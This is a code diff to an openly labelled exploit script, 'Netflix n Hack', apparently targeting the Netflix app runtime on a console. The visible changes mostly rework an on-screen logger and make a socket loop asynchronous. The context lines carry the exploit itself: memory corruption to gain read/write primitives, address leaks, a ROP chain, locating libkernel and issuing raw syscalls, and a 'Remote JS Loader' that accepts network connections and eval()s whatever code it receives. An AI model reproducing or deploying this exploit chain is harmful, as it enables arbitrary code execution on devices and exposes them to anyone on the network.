@@ -27,40 +27,20 @@ const ws = {
 const logger = {
     overlay: null,
     lines: [],
+    widgets: [],
     maxLines: 40,
     refreshTimer: null,
+    pendingRefresh: false,
     init() {
-        this.overlay = nrdp.gibbon.makeWidget({
-            name: "dbg",
-            width: 1280,
-            height: 720,
-            backgroundColor: "#000000"
-        });
-    
-        nrdp.gibbon.scene.overlay = this.overlay;
-    },
-    log(msg) {
-        ws.send(msg);
-        this.lines.push(msg);
-        if (this.lines.length > this.maxLines) this.lines.shift();
-        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
-        this.refreshTimer = nrdp.setTimeout(() => {
-            this.refresh();
-            this.refreshTimer = null;
-        }, 50);
-    },
-    refresh() {
-        if (!this.overlay) return;
-        if (this.overlay.children) {
-            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
-                var child = this.overlay.children[j];
-                if (child && child._name && child._name.startsWith("ln")) {
-                    this.overlay.removeChild(child);
-                }
-            }
-        }
+        this.overlay = nrdp.gibbon.makeWidget();
+        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
+        this.overlay.width = 1280;
+        this.overlay.height = 720;
 
-        for (var i = 0; i < this.lines.length; i++) {
+        nrdp.gibbon.scene.widget = this.overlay;
+
+        // Pre-create all text widgets once to avoid removal/recreation overhead
+        for (var i = 0; i < this.maxLines; i++) {
             var w = nrdp.gibbon.makeWidget({
                 name: "ln" + i,
                 x: 10,
@@ -68,10 +48,10 @@ const logger = {
                 width: 1260,
                 height: 15
             });
-            
+
             w.text = {
-                contents: this.lines[i],
-                size: 10,
+                contents: "",
+                size: 12,
                 color: {
                     a: 255,
                     r: 0,
@@ -82,6 +62,65 @@ const logger = {
             };
 
             w.parent = this.overlay;
+            this.widgets.push(w);
+        }
+    },
+    log(msg) {
+        ws.send(msg);
+        this.lines.push(msg);
+        if (this.lines.length > this.maxLines) this.lines.shift();
+
+        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
+        this.refreshTimer = nrdp.setTimeout(() => {
+            this.refresh();
+            this.refreshTimer = null;
+        }, 50);
+
+        this.pendingRefresh = true;
+    },
+    refresh() {
+        if (!this.overlay) return;
+
+        // Update widget text content without recreating widgets
+        for (var i = 0; i < this.maxLines; i++) {
+            if (i < this.lines.length) {
+                this.widgets[i].text = {
+                    contents: this.lines[i],
+                    size: 12,
+                    color: {
+                        a: 255,
+                        r: 0,
+                        g: 255,
+                        b: 0
+                    },
+                    wrap: false
+                };
+            } else {
+                // Clear unused widget slots
+                this.widgets[i].text = {
+                    contents: "",
+                    size: 12,
+                    color: {
+                        a: 255,
+                        r: 0,
+                        g: 255,
+                        b: 0
+                    },
+                    wrap: false
+                };
+            }
+        }
+
+        this.pendingRefresh = false;
+    },
+    flush() {
+        // Force immediate refresh if needed (call before blocking operations)
+        if (this.refreshTimer) {
+            nrdp.clearTimeout(this.refreshTimer);
+            this.refreshTimer = null;
+        }
+        if (this.pendingRefresh) {
+            this.refresh();
         }
     }
 }
@@ -235,8 +274,9 @@ function stringToBytes (str) {
 function main () {
 
     logger.init();
-    
+
     logger.log("=== Netflix n Hack ===");
+    logger.flush(); // Force immediate display
 
     try {
 
@@ -346,6 +386,7 @@ function main () {
 
         write32_unstable(add_string, 0x41414141n);
         logger.log("Overwritten value of 'string' (should be AAAA): " + string );
+        logger.flush();
         
         let typed_arr = new Int8Array(8);
         let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
@@ -726,10 +767,12 @@ function main () {
         }
 
         logger.log("Stable Primitives Achieved.");
+        logger.flush();
 
         const rop_address = get_backing_store(fake_rop);
         logger.log("Address of ROP obj: " + hex(addrof(fake_rop)) );
         logger.log("Address of ROP: " + hex(rop_address) );
+        logger.flush();
 
         function rop_smash (x) {
           let a = 100;
@@ -855,6 +898,7 @@ function main () {
         /***** LibKernel *****/
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
+        logger.flush();
 
         function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
         {            
@@ -1061,13 +1105,20 @@ function main () {
         let network_str = current_ip + ":" + port;
         logger.log("Remote JS Loader listening on " + network_str);
         send_notification("Remote JS Loader\nListening on " + network_str);
+        logger.flush(); // Force display before entering async loop
 
-        while (true) {
-            try {
-                logger.log("Awaiting connection at " + network_str);
+        // Async socket accept loop - allows logger to stay responsive
+        (async () => {
+            while (true) {
+                try {
+                    logger.log("Awaiting connection at " + network_str);
+                    logger.flush();
 
-                write32_uncompressed(addrlen, 16);
-                const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
+                    // Yield to event loop before blocking accept() call
+                    await new Promise(resolve => nrdp.setTimeout(resolve, 10));
+
+                    write32_uncompressed(addrlen, 16);
+                    const client_fd = syscall(SYSCALL.accept, sock_fd, sockaddr_in, addrlen);
 
                 if (client_fd === 0xffffffffffffffffn) {
                     logger.log("accept() failed: " + toHex(client_fd) + " - recreating socket");
@@ -1081,6 +1132,7 @@ function main () {
                 }
 
                 logger.log("Client connected, fd: " + Number(client_fd));
+                logger.flush();
 
                 let total_read = 0;
                 let read_error = false;
@@ -1123,21 +1175,29 @@ function main () {
                 const js_code = String.fromCharCode.apply(null, bytes);
 
                 logger.log("Executing payload...");
+                logger.flush();
                 eval(js_code);
                 logger.log("Executed successfully");
+                logger.flush();
 
                 syscall(SYSCALL.close, client_fd);
                 logger.log("Connection closed");
+                logger.flush();
 
             } catch (e) {
                 logger.log("ERROR in accept loop: " + e.message);
                 logger.log(e.stack);
+                logger.flush();
             }
         }
+        })(); // End of async socket accept loop
+
     } catch (e) {
         logger.log("EXCEPTION: " + e.message);
         logger.log(e.stack);
+        logger.flush();
     }
 }
 
-ws.init("10.0.0.2", 1337, main);
+//ws.init("10.0.0.2", 1337, main);// uncomment this to enable WebSocket logging
+main();
